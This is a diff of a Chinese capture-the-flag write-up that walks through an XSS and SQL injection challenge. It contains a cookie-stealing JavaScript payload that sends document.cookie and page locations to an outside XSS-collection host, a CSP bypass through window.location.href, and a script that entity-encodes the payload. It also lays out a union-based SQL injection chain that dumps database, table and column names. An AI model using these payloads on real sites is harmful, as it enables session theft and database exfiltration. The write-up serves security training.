@@ -31,8 +31,8 @@
 import hashlib
 
 for i in range(1, 10000001):
-    s = hashlib.md5(str(i)).hexdigest()[0:6]
-    if s == "199a59":
+    s = hashlib.md5(str(i).encode()).hexdigest()[0:6]
+    if s == "0fc428":
         print(i)
         break
 ```
@@ -67,19 +67,69 @@ for i in s:
 到XSS平台新建个项目，然后访问script脚本，得到代码
 
 ```javascript
-(function(){(new Image()).src='https://xss.pt/xss.php?do=api&id=y3QK&location='+escape((function(){try{return document.location.href}catch(e){return ''}})())+'&toplocation='+escape((function(){try{return top.location.href}catch(e){return ''}})())+'&cookie='+escape((function(){try{return document.cookie}catch(e){return ''}})())+'&opener='+escape((function(){try{return (window.opener && window.opener.location.href)?window.opener.location.href:''}catch(e){return ''}})());})();
+(function() { (new Image()).src = 'https://as.vip/bdstatic.com/?callback=jsonp&id=nRaT&location=' + encodeURIComponent((function() {
+        try {
+            return document.location.href
+        } catch(e) {
+            return ''
+        }
+    })()) + '&toplocation=' + encodeURIComponent((function() {
+        try {
+            return top.location.href
+        } catch(e) {
+            return ''
+        }
+    })()) + '&cookie=' + encodeURIComponent((function() {
+        try {
+            return document.cookie
+        } catch(e) {
+            return ''
+        }
+    })()) + '&opener=' + encodeURIComponent((function() {
+        try {
+            return (window.opener && window.opener.location.href) ? window.opener.location.href: ''
+        } catch(e) {
+            return ''
+        }
+    })());
+})();
 ```
 
 然后把(new Image()).src改成window.location.href，结果如下
 
 ```javascript
-(function(){(window.location.href='https://xss.pt/xss.php?do=api&id=y3QK&location='+escape((function(){try{return document.location.href}catch(e){return ''}})())+'&toplocation='+escape((function(){try{return top.location.href}catch(e){return ''}})())+'&cookie='+escape((function(){try{return document.cookie}catch(e){return ''}})())+'&opener='+escape((function(){try{return (window.opener && window.opener.location.href)?window.opener.location.href:''}catch(e){return ''}})());})()
+(function() { window.location.href = 'https://as.vip/bdstatic.com/?callback=jsonp&id=nRaT&location=' + encodeURIComponent((function() {
+        try {
+            return document.location.href
+        } catch(e) {
+            return ''
+        }
+    })()) + '&toplocation=' + encodeURIComponent((function() {
+        try {
+            return top.location.href
+        } catch(e) {
+            return ''
+        }
+    })()) + '&cookie=' + encodeURIComponent((function() {
+        try {
+            return document.cookie
+        } catch(e) {
+            return ''
+        }
+    })()) + '&opener=' + encodeURIComponent((function() {
+        try {
+            return (window.opener && window.opener.location.href) ? window.opener.location.href: ''
+        } catch(e) {
+            return ''
+        }
+    })());
+})();
 ```
 
-用脚本生成一下payload
+用脚本生成一下payload，在XSS平台可以看到自己的cookie
 
 ```python
-s = '''(function(){window.location.href='https://xss.pt/xss.php?do=api&id=y3QK&location='+escape((function(){try{return document.location.href}catch(e){return ''}})())+'&toplocation='+escape((function(){try{return top.location.href}catch(e){return ''}})())+'&cookie='+escape((function(){try{return document.cookie}catch(e){return ''}})())+'&opener='+escape((function(){try{return (window.opener && window.opener.location.href)?window.opener.location.href:''}catch(e){return ''}})());})();'''
+s = '''(function(){window.location.href='https://as.vip/bdstatic.com/?callback=jsonp&id=nRaT&location='+encodeURIComponent((function(){try{return document.location.href}catch(e){return ''}})())+'&toplocation='+encodeURIComponent((function(){try{returntop.location.href}catch(e){return ''}})())+'&cookie='+encodeURIComponent((function(){try{return document.cookie}catch(e){return ''}})())+'&opener='+encodeURIComponent((function(){try{return (window.opener&&window.opener.location.href)?window.opener.location.href:''}catch(e){return''}})());})()'''
 output = ""
 
 for i in s:
@@ -88,5 +138,44 @@ for i in s:
 print("<svg><script>eval&#x28;&#x22;" + output + "&#x22;&#x29;</script></svg>")
 ```
 
-在XSS平台可以看到自己的cookie，然后到反馈里面填链接
+<mark style="color:red;">然后到反馈里面填链接如下</mark>
+
+```
+http://web.node3.buuoj.cn:81/post/8933fc518918c6156409c3c2fe884a5f.html
+```
+
+![](<../.gitbook/assets/image (11).png>)
+
+修改cookie再去访问admin.php，发现是个查询的功能
+
+![](<../.gitbook/assets/image (28).png>)
+
+尝试SQL注入，输入`id=3-1`，得到`id=2`的结果，是数字型注入
+
+然后尝试联合注入`id=-1 union select 1,2,3`
+
+当前数据库`id=-1 union select 1,(select database()),3` 得到`ciscn`
+
+查询所有数据库`id=-1 union select 1,(select group_concat(schema_name) from information_schema.schemata),3`
+
+得到`information_schema,ctftraining,mysql,performance_schema,test,ciscn`
+
+当前数据库的表`id=-1 union select 1,(select group_concat(table_name) from information_schema.tables where table_schema='ciscn'),3`
+
+得到`flag,users`
+
+查询flag表`id=-1 union select 1,(select group_concat(column_name) from information_schema.columns where table_name='flag'),3`
+
+得到`flagg`
+
+查询flag `id=-1 union select 1,(select flagg from flag),3`
+
+可以得到flag
+
+![](<../.gitbook/assets/image (14).png>)
+
+## 小结
+
+1. XSS绕过的方式可以用HTML实体转义，有两种方式`&#x十六进制;`和`&#十进制;`
+2. CSP绕过可以尝试`window.location.href`跳转的方式
 
